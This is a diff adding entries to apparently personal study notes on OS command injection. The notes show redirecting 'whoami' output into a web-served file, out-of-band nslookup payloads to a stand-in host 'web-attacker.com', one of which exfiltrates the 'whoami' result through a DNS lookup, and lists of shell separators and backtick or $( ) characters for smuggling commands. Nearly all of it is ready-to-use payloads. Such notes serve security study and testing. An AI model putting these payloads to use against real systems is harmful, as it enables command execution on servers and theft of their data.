@@ -33,3 +33,32 @@ We can redirect output of command to some file we can have access
 & whoami > /var/www/static/whoami.txt &
 ```
 Then we just access the file whoami.txt from browser
+
+### OAST interaction
+```
+& nslookup kgji2ohoyw.web-attacker.com &
+```
+
+### OAST data exfiltration
+```
+nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+```
+## Characters for OSI
+Both for Windows and UNIX
+```
+&
+&&
+||
+|
+```
+Only for Linux:
+```
+;
+newline (\n or 0x0a)
+```
+On UNIX systems we can also use inline exec chars:
+```
+`command`
+$(command)
+```
+If input is controlled by quotes, we must separate thenm with ' or "
